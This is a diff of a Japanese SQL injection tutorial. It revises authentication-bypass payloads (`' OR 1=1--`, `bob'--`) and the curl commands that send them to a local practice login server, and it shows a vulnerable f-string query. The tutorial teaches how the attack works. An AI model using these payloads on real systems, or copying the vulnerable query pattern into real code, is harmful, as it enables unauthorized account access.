@@ -15,12 +15,12 @@ structured query language(構造化された問い合わせ言語)の略です�
 ```SQL
 f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
 ```
-このようにSQL文を作ってしまうと`username=' OR 1=1;--`という入力だった場合に
+このようにSQL文を作ってしまうと`username=' OR 1=1--`という入力だった場合に
 ```SQL
-SELECT * FROM users WHERE username = '' OR 1=1;--' AND password = ''
+SELECT * FROM users WHERE username = '' OR 1=1--' AND password = ''
 ```
 という問い合わせ文が作成されます。
-`--`はその後ろをコメントアウトする、`;`はSQL文がここまでだということを表しています。
+`--`はその後ろをコメントアウトすることを表しています。
 WHEREが直接的には、users表から一行ずつ取り出し、username='{username}'という式がTrueかどうかを判定し、Trueの場合はその行を返すという処理をしています。
 そのためusername = ''はほとんどの場合、すべての行でFalseですが、1=1は常にTrueなためすべての行が返ってしまいます。
 ## 攻撃の実験(ローカル環境)
@@ -42,16 +42,16 @@ WHEREが直接的には、users表から一行ずつ取り出し、username='{us
 :::details 解答
 
  - ブラウザを使った方法
-usernameに`' OR 1=1;--`と入力し、ログインボタンを押す。
+usernameに`' OR 1=1--`と入力し、ログインボタンを押す。
 
  - shellを使った方法
 ターミナル
 ```bash
-curl -X POST http://localhost:8000 -d "username=' OR 1=1;--"
+curl -X POST http://localhost:8000 -d "username=' OR 1=1--"
 ```
 powershell
 ```powershell
-curl.exe -X POST http://localhost:8000 -d "username=' OR 1=1;--"
+curl.exe -X POST http://localhost:8000 -d "username=' OR 1=1--"
 ```
 
 ### 解説
@@ -64,16 +64,16 @@ A OR True=Trueという文はAにかかわらず常にTrueなためすべての�
 :::details 解答
 
  - ブラウザを使った方法
-usernameに`bob';--`と入力し、ログインボタンを押す。
+usernameに`bob'--`と入力し、ログインボタンを押す。
 
  - shellを使った方法
 ターミナル
 ```bash
-curl -X POST http://localhost:8000 -d "username=bob';--"
+curl -X POST http://localhost:8000 -d "username=bob'--"
 ```
 powershell
 ```powershell
-curl.exe -X POST http://localhost:8000 -d "username=bob';--"
+curl.exe -X POST http://localhost:8000 -d "username=bob'--"
 ```
 ### 解説
 usernameがbobである行が返るためbobになりすますことができます。passwordの評価をコメントアウトしているためusernameが一致した行が無条件で返ります。
